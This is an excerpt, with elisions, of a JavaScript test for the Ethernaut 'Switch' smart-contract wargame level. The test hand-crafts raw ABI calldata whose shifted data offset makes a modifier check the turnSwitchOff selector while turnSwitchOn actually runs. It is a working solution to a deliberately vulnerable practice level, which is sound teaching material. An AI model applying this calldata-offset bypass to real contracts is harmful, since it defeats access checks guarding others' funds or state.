...
contract('Switch', function(accounts) {
  ...
  before(async function() {
    ...
    instance = await utils.createLevelInstance(
      ethernaut, level.address, player, Switch,
      {from: player}
    )
  });
  ...
  describe('instance', function() {
    ...
    it('it should allow the user to solve the level', async function() {
      ...
      let flipSwitchSelector = web3.sha3("flipSwitch(bytes)").substring(2,10)
      let onFunctionSelector = web3.sha3("turnSwitchOn()").substring(2,10)
      let offFunctionSelector = web3.sha3("turnSwitchOff()").substring(2,10)

      let dataPosition = '20' // hex for 32
      let dataLength = 4 // _data only has a 4 byte length

      // construct standard calldata
      let calldata = flipSwitchSelector //flipSwitch function selector
                     + "0".repeat(62) + dataPosition.toString() // hex position of _data
                     + "0".repeat(63) + dataLength.toString() // length of _data
                     + offFunctionSelector + "0".repeat(56) // The _data variable, containing the turnSwitchOff selector
      ...
      calldata = flipSwitchSelector // flipSwitch function selector
                 + "0".repeat(62) + newDataPosition.toString() // data position : skip 2 32-byte slots
                 + "0".repeat(64)  // empty 32-byte slot - we don't care about it
                 + offFunctionSelector + "0".repeat(56) // the function selector that is checked by the modifier
                 + "0".repeat(63) + dataLength.toString() // the location of _data, starts with it's length
                 + onFunctionSelector + "0".repeat(56) // the actual location of _data (we use the turnSwitchOn function selector)
